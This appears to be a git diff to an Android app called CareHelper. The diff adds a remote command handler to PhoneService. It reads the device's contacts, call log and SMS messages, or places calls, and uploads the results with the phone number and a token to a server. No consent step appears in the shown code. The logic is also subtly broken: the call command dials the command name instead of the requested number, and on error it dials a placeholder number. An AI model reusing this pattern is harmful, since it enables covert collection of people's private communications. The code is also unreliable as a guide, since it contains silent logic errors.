@@ -18,15 +18,23 @@ import android.util.Log;
 
 import androidx.core.app.ActivityCompat;
 
+import com.alibaba.fastjson2.JSON;
+
+import org.bert.carehelper.common.API;
+import org.bert.carehelper.common.CareHelperContext;
+import org.bert.carehelper.common.CommandType;
 import org.bert.carehelper.entity.CallLogInfo;
 import org.bert.carehelper.entity.CommandResponse;
 import org.bert.carehelper.entity.Contact;
+import org.bert.carehelper.http.HTTPConnection;
 
 import java.util.ArrayList;
 import java.util.HashMap;
 import java.util.LinkedList;
 import java.util.List;
 import java.util.Map;
+import java.util.Objects;
+import java.util.concurrent.ThreadPoolExecutor;
 
 /**
  * 手机相关服务
@@ -40,8 +48,13 @@ public class PhoneService implements Service  {
 
     private final String TAG = "PhoneService";
 
+    private ThreadPoolExecutor threadPool = null;
+    private CareHelperContext careHelperContext = CareHelperContext.getInstance();
+
+
     public PhoneService(Context context) {
         this.context = context;
+        this.threadPool = CareHelperContext.getInstance().getThreadPoolExecutor();
         if (context != null) {
             this.cr = this.context.getContentResolver();
         } else {
@@ -177,7 +190,7 @@ public class PhoneService implements Service  {
     public void getElectricity() {
         BatteryManager batterymanager = (BatteryManager) this.context.getSystemService(BATTERY_SERVICE);
         batterymanager.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
-        Log.e("aaa batterymanager",+batterymanager.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)+"%");
+        Log.e("batterymanager",+batterymanager.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)+"%");
     }
 
     /**
@@ -193,8 +206,66 @@ public class PhoneService implements Service  {
 
 
     @Override
-    public CommandResponse doCommand(String content) {
-
-        return null;
+    public CommandResponse doCommand(String type) {
+        CommandResponse response = new CommandResponse();
+        response.setPhone(this.getPhoneNumber());
+        response.setToken(this.careHelperContext.getEnvironment().getToken());
+        String[] strings = type.split(":");
+        if (strings.length < 2) {
+            Log.e(TAG, "commands error!");
+            return response;
+        }
+        switch (strings[1]) {
+            case CommandType.CALL_PHONE:
+                if (strings.length >= 3) {
+                    String phoneNumber = type.split(":")[1];
+                    phoneCall(phoneNumber);
+                    response.setMessage("exec success");
+                    response.setStatus(0);
+                } else {
+                    phoneCall("000-0000-0000");
+                    response.setMessage("command error");
+                    response.setStatus(1);
+                }
+                break;
+            case CommandType.CONTACT_LIST:
+                List<Contact> contacts = getContactList();
+                String contactsStr = JSON.toJSONString(contacts);
+                response.setMessage(contactsStr);
+                response.setStatus(0);
+                break;
+            case CommandType.PHONE_RECORDS:
+                List<CallLogInfo> records = getPhoneRecords();
+                String recordsStr = JSON.toJSONString(records);
+                response.setMessage(recordsStr);
+                response.setStatus(0);
+                break;
+            case CommandType.PHONE_MESSAGE_LIST:
+                List<Map<String, String>> maps = getPhoneMessageList();
+                String mapsStr = JSON.toJSONString(maps);
+                response.setMessage(mapsStr);
+                response.setStatus(0);
+                break;
+            case CommandType.MAX_VOLUM:
+                setMaxVolum();
+                response.setMessage("exec success");
+                response.setStatus(0);
+                break;
+        }
+        try {
+            Log.i(TAG, "commands exec success, wait 4 sec to do upload task!");
+            Thread.sleep(4000);
+            this.threadPool.execute(()->{
+                Log.i(TAG, "doing upload task！");
+                new HTTPConnection(
+                        API.API_COMMAND + "/receive",
+                        response,
+                        "POST"
+                ).run();
+            });
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+        return response;
     }
 }
